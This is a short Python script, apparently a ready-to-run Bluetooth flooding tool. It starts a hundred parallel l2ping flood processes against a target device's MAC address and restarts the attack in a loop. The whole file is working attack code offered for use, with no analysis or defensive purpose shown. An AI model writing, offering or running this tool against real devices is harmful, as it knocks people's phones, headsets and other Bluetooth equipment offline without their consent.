import subprocess
import threading
import sys
import argparse
from time import sleep

def l2ping_flood(mac):
    with subprocess.Popen(["l2ping", "-s", "600", "-f", mac]) as p:
        p.communicate()
 
def restart_countdown(seconds):
    print('\n')
    for i in range(seconds):
        print("Target unreachable, retrying in: ", (seconds - i), "  ", end='\r')
        sleep(1)
    print("\nRestarting...", end='\n')

def main():
    try:
        parser = argparse.ArgumentParser()
        parser.add_argument('mac', help='MAC address of device to smash')
        parser.add_argument('-p', '--processes', help='Number of process to run l2ping on. Default is 100', default=100, type=int)
        args = parser.parse_args()
        threads = []
        for i in range(args.processes):
            t = threading.Thread(target=l2ping_flood, args=(args.mac,))
            t.daemon = True
            t.start()
            threads.append(t)
        for t in threads:
            t.join()

        restart_countdown(10)
        main()
    except KeyboardInterrupt:
        print("\nStopping attack.")

if __name__ == "__main__":
    main()
